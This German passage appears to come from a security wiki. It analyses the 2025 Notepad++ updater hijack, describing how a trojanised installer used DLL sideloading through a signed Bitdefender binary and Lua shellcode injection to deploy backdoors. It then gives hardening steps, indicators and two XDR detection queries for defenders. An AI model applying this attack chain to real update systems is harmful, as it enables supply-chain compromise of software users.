Zwischen Juni 2025 und Dezember 2025 lieferten Angreifer, die die Hosting-Infrastruktur hinter dem Notepad++-Updateprozess kompromittiert hatten, gezielt ausgewählten Opfern bösartige Manifeste aus. Ältere Updater auf WinGUp-Basis verifizierten die Authentizität von Updates nicht vollständig, sodass eine manipulierte XML-Antwort Clients auf von Angreifern kontrollierte URLs umleiten konnte. Da der Client HTTPS-Inhalte akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur des heruntergeladenen Installers zu erzwingen, luden Opfer ein trojanisiertes NSIS-`update.exe` herunter und führten es aus.<sup>[[12]](#references)[[13]](#references)</sup>

Ablauf der Operation (kein lokaler Exploit erforderlich):
1. **Abfangen der Infrastruktur**: CDN/Hosting kompromittieren und Updateprüfungen mit Angreifer-Metadaten beantworten, die auf eine bösartige Download-URL verweisen.
2. **Trojanisiertes NSIS**: Der Installer ruft eine Payload ab und führt sie aus; dabei werden zwei Ausführungsketten missbraucht:
   - **Eigene signierte Binärdatei + Sideloading**: Die signierte Bitdefender-`BluetoothService.exe` wird eingebunden und eine bösartige `log.dll` in ihrem Suchpfad abgelegt. Beim Start der signierten Binärdatei lädt Windows `log.dll` per Sideloading, die dann die Chrysalis-Backdoor entschlüsselt und reflektiv lädt (durch Warbird geschützt + API-Hashing zur Erschwerung statischer Erkennung).
   - **Skriptgesteuerte Shellcode-Injection**: NSIS führt ein kompiliertes Lua-Skript aus, das Win32-APIs (z. B. `EnumWindowStationsW`) verwendet, um Shellcode einzuschleusen und Cobalt Strike Beacon bereitzustellen.<sup>[[12]](#references)</sup>

Maßnahmen zur Härtung und Erkennung für alle Auto-Updater:
- **Zertifikats- und Signaturprüfung** des heruntergeladenen Installers erzwingen (Signierer des Anbieters festlegen, bei abweichendem CN/Zertifikatskette ablehnen) und das Update-Manifest selbst signieren (z. B. mit XMLDSig). Durch das Manifest gesteuerte Weiterleitungen blockieren, sofern sie nicht validiert wurden.
- **Sideloading eigener signierter Binärdateien** als Erkennungsmöglichkeit nach dem Download betrachten: Alarmieren, wenn eine signierte Anbieter-EXE eine DLL mit einem Namen außerhalb ihres kanonischen Installationspfads lädt (z. B. Bitdefender, das `log.dll` aus Temp/Downloads lädt), und wenn ein Updater Installer mit Nicht-Anbieter-Signaturen in einem temporären Verzeichnis ablegt oder ausführt.
- **Malwarespezifische Artefakte** überwachen, die in dieser Angriffskette beobachtet wurden (als allgemeine Erkennungspunkte nützlich): Mutex `Global\Jdhfv_1.0.1`, ungewöhnliche Schreibvorgänge von `gup.exe` nach `%TEMP%` und Lua-gesteuerte Shellcode-Injection-Phasen.
- Notepad++ reagierte mit einer Härtung von WinGUp in Version 8.8.9 und späteren Versionen: Das zurückgegebene XML ist nun signiert (XMLDSig), und neuere Builds erzwingen die Zertifikats- und Signaturprüfung des heruntergeladenen Installers, statt allein dem Übertragungsweg zu vertrauen.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading durch eine von Bitdefender signierte EXE: <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet ein Installationsprogramm, das nicht zu Notepad++ gehört</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

Diese Muster lassen sich auf beliebige Updater übertragen, die unsignierte Manifeste akzeptieren oder die Signatur des Installers nicht fest verankern – network hijack + malicious installer + BYO-signed sideloading führen zu Remote Code Execution unter dem Deckmantel „vertrauenswürdiger“ Updates.

---
## References
- [1] [Sicherheitshinweis – Netskope Client for Windows – Lokale Rechteausweitung über einen Rogue-Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre und Razer Synapse 4 pwnen](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Lokale Rechteausweitung über beschreibbare Dateien im Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Rechteausweitung im Windows-Agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Staatliche Akteure nutzen die Notepad++-Lieferkette aus](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – Update zum Vorfall mit gekaperter Infrastruktur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Umgehung des Fixes für CVE-2025-0309 im Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Aufdeckung von Fehlern zur Rechteausweitung in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
